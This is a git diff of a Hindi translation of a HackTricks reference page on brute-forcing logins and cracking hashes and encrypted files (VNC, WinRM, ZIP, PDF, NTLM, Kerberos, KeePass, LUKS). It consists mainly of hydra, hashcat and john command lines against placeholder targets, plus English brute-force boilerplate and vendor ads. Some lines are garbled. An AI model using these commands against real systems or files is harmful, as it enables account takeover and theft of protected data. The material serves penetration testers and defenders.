@@ -568,18 +483,16 @@ legba telnet \
 --telnet-prompt ":~$ " \
 --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
 ```
-
-#### VNC
+### VNC
 
 वीएनसी
-
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
 medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
 use auxiliary/scanner/vnc/vnc_login
-nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
 legba vnc --target localhost:5901 --password data/passwords.txt
 
 #Metasploit
@@ -587,28 +500,25 @@ use auxiliary/scanner/vnc/vnc_login
 set RHOSTS <ip>
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```
-
-#### Winrm
-
+### Winrm
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **ऑटोमेट वर्कफ़्लो** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित हैं।\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और आसानी से **ऑटोमेट वर्कफ़्लो** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित है।\
 आज ही पहुंचें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-### स्थानीय
+## स्थानीय
 
-#### ऑनलाइन क्रैकिंग डेटाबेस
+### ऑनलाइन क्रैकिंग डेटाबेस
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 और SHA1)
 * [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 एस/एस/पी के साथ/बिना ESS/SSP और किसी भी चैलेंज के मान के साथ)
-* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (हैश, WPA2 कैप्चर्स, और आर्काइव्स MSOffice, ZIP, PDF...)
+* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (हैश, WPA2 कैप्चर, और आर्काइव MSOffice, ZIP, PDF...)
 * [https://crackstation.net/](https://crackstation.net) (हैश)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 * [https://gpuhash.me/](https://gpuhash.me) (हैश और फ़ाइल हैश)
@@ -618,10 +528,9 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-इसे जांचें इससे पहले कि आप किसी हैश को ब्रूट फ़ोर्स करने की कोशिश करें।
+इसे जांचें जब आप किसी हैश को ब्रूट फ़ोर्स करने की कोशिश कर रहे हो।
 
-#### ZIP
-
+### ZIP
 ```bash
 #sudo apt-get install fcrackzip
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
@@ -637,12 +546,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
+#### ज्ञात प्लेनटेक्स्ट zip हमला
 
-**पता चला प्लेनटेक्स्ट ज़िप हमला**
-
-आपको एक फ़ाइल के **प्लेनटेक्स्ट** (या प्लेनटेक्स्ट का हिस्सा) **को जानने की आवश्यकता है** जो एन्क्रिप्टेड ज़िप में है। आप **एन्क्रिप्टेड ज़िप में शामिल फ़ाइलों के नाम और आकार की जाँच कर सकते हैं** चलाकर: **`7z l encrypted.zip`**\
+आपको एक फ़ाइल के **प्लेनटेक्स्ट** (या प्लेनटेक्स्ट का हिस्सा) को जानने की आवश्यकता है, जो एन्क्रिप्टेड zip में है। आप **एन्क्रिप्टेड zip में शामिल फ़ाइलों के नाम और आकार की जाँच कर सकते हैं** चलाकर: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)को रिलीज़ पेज से डाउनलोड करें।
-
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -654,11 +561,7 @@ zip plaintext.zip plaintext.file
 ./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
 unzip unlocked.zip #User new_pwd as password
 ```
-
-#### 7z
-
-#### 7z
-
+### 7z
 ```bash
 cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
 ```
@@ -669,11 +572,9 @@ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo
 apt-get install libcompress-raw-lzma-perl
 ./7z2john.pl file.7z > 7zhash.john
 ```
+### PDF
 
-#### PDF
-
-#### पीडीएफ
-
+एक PDF फ़ाइल को ब्रूट फ़ोर्स के लिए खोलने के लिए कई उपकरण उपलब्ध हैं। यह उपकरण एक विशेष शब्द सूची का उपयोग करते हैं जो फ़ाइल को खोलने के लिए प्रयास करते हैं।
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -682,13 +583,11 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
+### PDF Owner Password
 
-#### PDF मालिक पासवर्ड
+PDF Owner password को क्रैक करने के लिए यह चेक करें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
-PDF मालिक पासवर्ड को क्रैक करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
-
-#### JWT
-
+### JWT
 ```bash
 git clone https://github.com/Sjord/jwtcrack.git
 cd jwtcrack
@@ -700,17 +599,13 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-
-#### NTLM क्रैकिंग
-
+### NTLM क्रैकिंग
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
 hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
 ```
-
-#### Keepass
-
+### Keepass
 ```bash
 sudo apt-get install -y kpcli #Install keepass tools like keepass2john
 keepass2john file.kdbx > hash #The keepass is only using password
@@ -718,30 +613,24 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 #The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-
-#### केबेरोस्टिंग
-
+### केबेरोस्टिंग
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
+### Lucks इमेज
 
-#### भाग्य छवि
-
-**विधि 1**
+#### विधि 1
 
 स्थापित करें: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
-
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-
-**विधि 2**
-
+#### विधि 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -750,39 +639,33 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-
 एक और Luks BF ट्यूटोरियल: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
-#### Mysql
-
+### Mysql
 ```bash
 #John hash format
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-
-#### PGP/GPG निजी कुंजी
-
+### PGP/GPG निजी कुंजी
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
+### सिस्को
 
-#### सिस्को
+<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
-
-#### DPAPI मास्टर कुंजी
+### DPAPI मास्टर कुंजी
 
 उपयोग करें [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) और फिर जॉन
 
-#### ओपन ऑफिस पासवर्ड से सुरक्षित स्तंभ
+### ओपन ऑफिस पासवर्ड से सुरक्षित स्तंभ
 
-यदि आपके पास एक xlsx फ़ाइल है जिसमें एक स्तंभ पासवर्ड से सुरक्षित है, तो आप इसे अनप्रोटेक्ट कर सकते हैं:
+यदि आपके पास एक xlsx फ़ाइल है जिसमें एक पासवर्ड द्वारा सुरक्षित कॉलम है, तो आप इसे अनप्रोटेक्ट कर सकते हैं:
 
 * **इसे गूगल ड्राइव पर अपलोड करें** और पासवर्ड स्वचालित रूप से हटा दिया जाएगा
-* इसे **मैन्युअल** रूप से **हटाने** के लिए:
-
+* **हटाने** के लिए **मैन्युअल** इसे:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -791,75 +674,64 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 # Remove that line and rezip the file
 zip -r file.xls .
 ```
-
-#### PFX प्रमाणपत्र
-
+### PFX प्रमाणपत्र
 ```bash
 # From https://github.com/Ridter/p12tool
 ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **ऑटोमेट वर्कफ़्लो** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित हैं।\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और आसानी से **ऑटोमेट वर्कफ़्लो** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित है।\
 आज ही पहुंच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-### उपकरण
+## उपकरण
 
 **हैश उदाहरण:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-#### हैश-पहचानकर
-
+### हैश-पहचानकर
 ```bash
 hash-identifier
 > <HASH>
 ```
-
-#### शब्द-सूचियाँ
+### शब्द-सूचियाँ
 
 * **Rockyou**
 * [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 * [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 * [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-#### **शब्द-सूचि उत्पादन उपकरण**
+### **शब्द-सूचि उत्पादन उपकरण**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** समर्थित बेस वर्ण, कीमैप और रूट के साथ उन्नत कीबोर्ड-चलन जेनरेटर।
-
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** समर्थित बेस वर्ण, कीमैप और रूट कॉन्फ़िगर करने के साथ एडवांस्ड कीबोर्ड-वॉक जेनरेटर।
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-
-#### जॉन म्युटेशन
+### जॉन म्युटेशन
 
 _**/etc/john/john.conf**_ पढ़ें और इसे कॉन्फ़िगर करें
-
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
+### Hashcat
 
-#### Hashcat
-
-**Hashcat हमले**
+#### Hashcat हमले
 
 * **वर्डलिस्ट हमला** (`-a 0`) नियमों के साथ
 
 **Hashcat** पहले से ही **नियम वाले फोल्डर** के साथ आता है लेकिन आप [**यहाँ दूसरे दिलचस्प नियम पा सकते हैं**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)।
-
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-
 * **शब्दसूची संयोजक** हमला
 
-हैशकैट के साथ **2 शब्दसूचियों को 1 में कॉम्बाइन** करना संभव है। यदि सूची 1 में शब्द **"नमस्ते"** था और दूसरे में शब्द **"दुनिया"** और **"पृथ्वी"** के 2 लाइन्स थे। शब्द `नमस्तेदुनिया` और `नमस्तेपृथ्वी` उत्पन्न होंगे।
-
+हैशकैट के साथ **2 शब्दसूचियों को 1 में मिलाना** संभव है।
+यदि सूची 1 में शब्द **"नमस्ते"** था और दूसरे में शब्द **"दुनिया"** और **"पृथ्वी"** के 2 लाइन थे। शब्द `नमस्तेदुनिया` और `नमस्तेपृथ्वी` उत्पन्न होंगे।
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -870,9 +742,7 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 ## hello-earth!
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
-
 * **मास्क हमला** (`-a 3`)
-
 ```bash
 # Mask attack with simple mask
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
@@ -904,9 +774,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-
 * वर्डलिस्ट + मास्क (`-a 6`) / मास्क + वर्डलिस्ट (`-a 7`) हमला
-
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -914,73 +782,75 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-
-**हैशकैट मोड्स**
-
+#### हैशकैट मोड्स
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-
 ## Brute Force
 
 ### Introduction
 
-Brute force attacks are a common method used to crack passwords by systematically trying all possible combinations until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute force attacks can be used to guess the passwords associated with the hashed values.
+Brute force attacks are a common method used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute force attacks can be used to guess the passwords associated with the hashed values.
 
-### Steps to Brute Force Linux Hashes
+### Steps to Perform Brute Force Attack on Linux Hashes
 
-1. **Obtain the Hashes**: First, you need to obtain the hashed passwords from the `/etc/shadow` file on a Linux system.
-2. **Choose a Tool**: Select a suitable tool for performing the brute force attack. Tools like John the Ripper, Hashcat, or Hydra are commonly used for this purpose.
-3. **Generate Wordlist**: Create a wordlist containing possible passwords to be used in the brute force attack. This can be a list of commonly used passwords, dictionary words, or custom combinations.
-4. **Initiate the Attack**: Use the chosen tool to start the brute force attack against the Linux hashes. The tool will systematically try each password in the wordlist until a match is found.
-5. **Crack the Hash**: Once the correct password is identified, the corresponding hash has been cracked. The cracked password can then be used to gain unauthorized access to the system.
+1. **Obtain the Hashed Passwords**: First, you need to obtain the hashed passwords from the `/etc/shadow` file on the Linux system you are targeting.
+
+2. **Choose a Brute Force Tool**: Select a suitable brute force tool that supports cracking Linux hashes. Tools like John the Ripper, Hashcat, and Hydra are commonly used for this purpose.
+
+3. **Configure the Brute Force Tool**: Set up the chosen tool to perform a brute force attack on the Linux hashes. Configure the tool to iterate through different combinations of characters based on the password complexity.
+
+4. **Start the Brute Force Attack**: Initiate the brute force attack using the configured tool. The tool will systematically try different password combinations until it finds the correct one associated with the hashed value.
+
+5. **Crack the Password**: Once the tool successfully cracks the password, you will be able to access the plaintext password associated with the hashed value obtained from the `/etc/shadow` file.
 
 ### Conclusion
 
-Brute force attacks can be a time-consuming process, especially if the passwords are complex or lengthy. However, they can be effective in cracking Linux hashes and gaining access to sensitive information stored on a system. It is essential for system administrators to use strong, unique passwords and employ additional security measures to protect against brute force attacks.
-
+Brute force attacks can be an effective method to crack Linux hashes and reveal plaintext passwords. It is essential to use strong and complex passwords to mitigate the risk of being compromised through brute force attacks.
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
+### Brute Forcing Windows Hashes
 
-## Brute Force
+Brute forcing Windows hashes involves trying all possible combinations of characters until the correct password is found. This can be done using tools like **John the Ripper** or **Hashcat**. The process can be time-consuming depending on the complexity of the password.
 
-### Introduction
+#### Steps to Brute Force Windows Hashes:
 
-Brute force attacks are a common way to crack passwords. In a brute force attack, the attacker tries every possible combination of characters until the correct password is found. This method can be used to crack Windows hashes by trying different passwords until a match is found.
+1. **Capture Hash**: Obtain the Windows hash that you want to crack.
+   
+2. **Wordlist**: Create or obtain a wordlist that contains potential passwords.
 
-### Tools
+3. **Brute Force Attack**: Use a tool like John the Ripper or Hashcat to perform the brute force attack.
 
-There are several tools available for performing brute force attacks on Windows hashes, such as **John the Ripper** and **Hashcat**. These tools can be used to automate the process of trying different passwords and cracking the hashes.
+4. **Wait**: Depending on the complexity of the password and the computing power available, the process may take some time.
 
-### Methodology
+5. **Cracked**: Once the correct password is found, you can use it to access the Windows system.
 
-To crack Windows hashes using a brute force attack, the attacker first needs to obtain the hash of the password they want to crack. This hash can be obtained from the Windows SAM file or by using tools like **Mimikatz** to extract the hashes from memory.
-
-Once the hash is obtained, the attacker can use a tool like John the Ripper or Hashcat to perform a brute force attack. These tools allow the attacker to specify the character set, password length, and other parameters to customize the attack.
-
-The brute force attack will then try every possible combination of characters within the specified parameters until the correct password is found. This process can be time-consuming, especially for complex passwords, but it is a reliable way to crack Windows hashes.
-
-### Conclusion
-
-Brute force attacks are a powerful tool for cracking passwords, including Windows hashes. By using tools like John the Ripper and Hashcat, attackers can automate the process of trying different passwords and eventually crack the hashes. It is important for users to use strong, complex passwords to protect against brute force attacks.
-
+Keep in mind that brute forcing is a resource-intensive process and may be illegal if done without proper authorization.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-
-#### Brute Force
+### Brute Force
 
 Brute force attacks involve systematically checking all possible keys or passwords until the correct one is found. This method is commonly used to crack common application hashes.
 
-#### ब्रूट फोर्स
+#### Steps to Perform a Brute Force Attack:
 
-ब्रूट फोर्स हमले में सभी संभावित कुंजी या पासवर्ड की प्रणालीकृत जांच शामिल है जब तक सही नहीं मिल जाता है। यह विधि सामान्य आवेदन हैश को क्रैक करने के लिए उपयोग की जाती है।
+1. **Generate Password List:** Create a list of potential passwords based on common patterns, dictionaries, or brute force tools.
+   
+2. **Automate the Process:** Use automated tools to systematically test each password from the generated list until the correct one is found.
+   
+3. **Adjust Parameters:** Modify the attack parameters such as password length, character set, and other settings to increase the chances of success.
+   
+4. **Monitor Progress:** Keep track of the progress of the brute force attack to determine the estimated time to crack the hash.
+   
+5. **Optimize Performance:** Optimize the attack by using parallel processing, distributed computing, or GPU acceleration to speed up the process.
 
+By following these steps, hackers can effectively crack common application hashes using brute force techniques.
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -990,25 +860,24 @@ Brute force attacks involve systematically checking all possible keys or passwor
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
-
 <details>
 
-<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>
+<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks का समर्थन करने के अन्य तरीके:
 
-* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
-* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* अगर आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
+* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
 * हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)\*\* पर फॉलो\*\* करें।
-* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos को PRs जमा करके।
+* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
+* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **ऑटोमेट वर्कफ़्लो** आसानी से बनाएं।\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **वर्कफ़्लो** को आसानी से बनाएं और स्वचालित करें।\
 आज ही पहुंचें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
